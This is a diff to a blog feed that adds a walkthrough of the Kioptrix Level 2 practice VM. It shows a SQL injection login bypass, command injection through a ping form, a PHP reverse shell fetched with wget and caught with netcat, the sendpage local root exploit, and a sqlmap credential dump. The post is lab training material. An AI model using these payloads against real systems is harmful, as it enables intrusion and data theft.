@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2014-06-13T00:44:05+03:00</updated>
+  <updated>2014-06-20T01:33:50+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,282 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
+    <link href="http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2/"/>
+    <updated>2014-06-16T22:47:31+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2</id>
+    <content type="html"><![CDATA[<p>Today I will walk through exploiting level 2 in the Kioptrix series.</p>
+
+<!-- more -->
+
+
+<p>Again, I first did a ping sweep with Nmap and determined the IP of the target is 192.168.127.162</p>
+
+<p>Next, the port scan:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.162
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-16 22:52 EEST
+</span><span class='line'>Nmap scan report for 192.168.127.162
+</span><span class='line'>Host is up (0.00036s latency).
+</span><span class='line'>Not shown: 65528 closed ports
+</span><span class='line'>PORT     STATE SERVICE  VERSION
+</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+</span><span class='line'>|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+</span><span class='line'>|_sshv1: Server supports SSHv1
+</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
+</span><span class='line'>| rpcinfo: 
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2            111/tcp  rpcbind
+</span><span class='line'>|   100000  2            111/udp  rpcbind
+</span><span class='line'>|   100024  1            630/udp  status
+</span><span class='line'>|_  100024  1            633/tcp  status
+</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+</span><span class='line'>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+</span><span class='line'>| Not valid before: 2009-10-07T23:10:47+00:00
+</span><span class='line'>|_Not valid after:  2010-10-07T23:10:47+00:00
+</span><span class='line'>|_ssl-date: 2014-06-16T16:42:47+00:00; -3h09m46s from local time.
+</span><span class='line'>| sslv2: 
+</span><span class='line'>|   SSLv2 supported
+</span><span class='line'>|   ciphers: 
+</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
+</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
+</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
+</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
+</span><span class='line'>| http-methods: Potentially risky methods: PUT
+</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
+</span><span class='line'>|_http-title: 403 Forbidden
+</span><span class='line'>633/tcp  open  status   1 (RPC #100024)
+</span><span class='line'>| rpcinfo: 
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2            111/tcp  rpcbind
+</span><span class='line'>|   100000  2            111/udp  rpcbind
+</span><span class='line'>|   100024  1            630/udp  status
+</span><span class='line'>|_  100024  1            633/tcp  status
+</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
+</span><span class='line'>MAC Address: 00:0C:29:20:9D:3E (VMware)
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 2.6.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
+</span><span class='line'>OS details: Linux 2.6.9 - 2.6.30</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>From web to shell</h3>
+
+<p>Pointing the browser to the target, we can see this remote admin login panel:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/login.png" title="admin login" alt="login"></p>
+
+<p>Immediately thinking SQL injection, I did a quick scan with Owasp Zap and indeed, the login can be bypassed using an injection like the following:</p>
+
+<p><code>&lsquo; or '1&rsquo; = &lsquo;1&rsquo; &mdash; </code></p>
+
+<p>Now we can see an interface where we can ping hosts, which might mean remote code execution:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/ping.png" title="ping ip" alt="ping"></p>
+
+<p>After testing the ping functionality, I ran a quick <em>uname -a</em> to confirm that remote code execution is possible:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>; uname -a
+</span><span class='line'>
+</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The semicolon is used to run multiple commands, so in this case I am closing the ping command and inputting another one after it. I tried poking around, checking if I can read /etc/shadow (which I can&rsquo;t, only /etc/passwd). The commands are ran by the <strong>apache</strong> user. So I&rsquo;m thinking, it&rsquo;s time for some PHP backdoor fun! I found some on Kali in <code>/usr/share/webshells/php</code></p>
+
+<p>First, I&rsquo;m going to copy the reverse PHP shell to my home directory and rename it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cp php-reverse-shell.php ~/shell.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see the description:</p>
+
+<blockquote><p>This script will make an outbound TCP connection to a hardcoded IP and port.
+The recipient will be given a shell running as the current user (apache normally).</p></blockquote>
+
+<p>Next I looked at the Php code, and I need to change the IP and port. The IP is the address of the attacker machine, and for the port I just threw 80 in there, since an outbound connection to port 80 is guaranteed to be allowed (if there was a firewall in place).</p>
+
+<p>With that done, the next step is to serve the shell on my machine and use the web interface to download it to the target host.</p>
+
+<p>On my machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 80 &lt; shell.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On the web interface:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>; wget 192.168.127.159:80 -O /tmp/puppies.php 
+</span><span class='line'>
+</span><span class='line'>; ls /tmp
+</span><span class='line'>
+</span><span class='line'>puppies.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now listen on my machine for the incoming connection:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 80 </span></code></pre></td></tr></table></div></figure>
+
+
+<p>And on the web interface, execute the shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>; php /tmp/puppies.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And we have a shell!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.127.159 80 from 192.168.127.162 (192.168.127.162) 32772 [32772]
+</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
+</span><span class='line'> 13:15:37 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
+</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
+</span><span class='line'>sh: no job control in this shell</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s time for privilege escalation! I will use the sendpage exploit:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/exploitdb/platforms/linux/local/9545.c ~/sendpage.c
+</span><span class='line'>nc -vv -l -p 5555 &lt; sendpage.c</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And from the shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.00# wget 192.168.127.159 -O /tmp/sendpage.c
+</span><span class='line'>sh-3.00# cd /tmp
+</span><span class='line'>sh-3.00# gcc -o sendpage sendpage.c
+</span><span class='line'>sh-3.00# chmod a+x sendpage
+</span><span class='line'>sh-3.00# ./sendpage
+</span><span class='line'>sh: no job control in this shell
+</span><span class='line'>sh-3.00# whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Breaking into the database</h3>
+
+<p>I will now explore a different attack vector, by using <strong>sqlmap</strong> to dump the juicy stuff of the database.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.127.162/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
+</span><span class='line'>Database: webapp
+</span><span class='line'>Table: users
+</span><span class='line'>[2 entries]
+</span><span class='line'>+----+----------+------------+
+</span><span class='line'>| id | username | password   |
+</span><span class='line'>+----+----------+------------+
+</span><span class='line'>| 1  | admin    | 5afac8d85f |
+</span><span class='line'>| 2  | john     | 66lajGGbla |
+</span><span class='line'>+----+----------+------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I couldn&rsquo;t connect to the MySQL database though, so didn&rsquo;t find a use for these credentials.</p>
+
+<p>I also tried an exploit against the CUPS daemon, to no avail. So I guess this is it for level 2.</p>
+
+<blockquote><p>You have an unusual magnetic personality.  Don&rsquo;t walk too close to
+metal objects which are not fastened down.</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Kioptrix Level 1]]></title>
